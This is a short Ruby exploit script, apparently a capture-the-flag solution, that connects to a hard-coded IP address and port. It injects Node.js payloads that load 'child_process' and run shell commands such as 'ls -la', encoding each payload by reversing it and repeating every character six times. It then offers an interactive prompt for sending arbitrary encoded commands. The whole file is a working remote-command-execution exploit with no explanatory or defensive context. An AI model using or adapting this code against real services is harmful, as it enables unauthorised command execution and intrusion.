#!/usr/bin/ruby
require 'socket'
HOST      = '188.166.133.53'
PORT      = 12589

@sock = TCPSocket.new(HOST, PORT)
@initial_payloads = ["this.sys=require('sys')", "this.ex=require('child_process').exec", 'this.ex("ls -la", function(error, stdout, stderr) { console.log(stdout); })']

def send_data(stuff)
  puts "PLOAD: #{stuff}"
  @sock.write("#{stuff.to_s}\n")
end

def generate_payload(input)
  pl = ''
  reverse = input.reverse
  reverse.split('').each do |c|
    pl += (c * 6)
  end
  send_data(pl)
  @initial_payloads.shift
end

def custom_input(input)
  pl = ''
  reverse = input.reverse
  reverse.split('').each do |c|
    pl += (c * 6)
  end
  send_data(pl)
end

loop do
  @data = @sock.recv(1024)
  puts @data unless @data.empty?
  if @initial_payloads.size >= 1
    generate_payload(@initial_payloads[0])
  else
    print '> '
    i = gets.chomp
    custom_input(i)
  end
end
